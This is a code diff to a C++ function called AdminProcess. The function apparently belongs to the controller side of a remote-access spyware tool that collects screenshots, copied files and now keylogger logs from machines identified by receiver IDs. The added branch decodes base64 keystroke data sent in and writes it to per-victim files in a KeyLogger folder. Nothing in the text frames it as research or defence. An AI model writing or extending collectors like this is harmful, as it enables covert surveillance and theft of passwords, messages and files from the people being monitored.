@@ -239,7 +239,7 @@ void MyCurl::AdminProcess(const vector<string> IDs, const int query) {
 				if (stoi(this->query) == query) {
 					if (query == 22) { //More query
 						subContent = base64_decode(subContent);
-						fstream file("_Data/screenshot" + receiverID + ".jpg", ios::out | ios::binary);
+						fstream file("_Data/Screecnshot/screenshot" + receiverID + ".jpg", ios::out | ios::binary);
 						file << subContent;
 						file.close();
 						cout << "Saved screenshot of " + receiverID << endl;
@@ -251,6 +251,13 @@ void MyCurl::AdminProcess(const vector<string> IDs, const int query) {
 						file << subContent;
 						file.close();
 						cout << "Saved copy file of at " << "_Data/Copy/" + fileName + receiverID << endl;
+					}
+					else if (query == 25) {
+						subContent = base64_decode(subContent);
+						fstream file("_Data/KeyLogger/keyLogger" + receiverID + ".txt", ios::out | ios::binary);
+						file << subContent;
+						file.close();
+						cout << "Saved copy file of at " << "_Data/KeyLogger/keyLogger" + receiverID + ".txt" << endl;
 					}
 					IDSet.erase(receiverID);
 				}
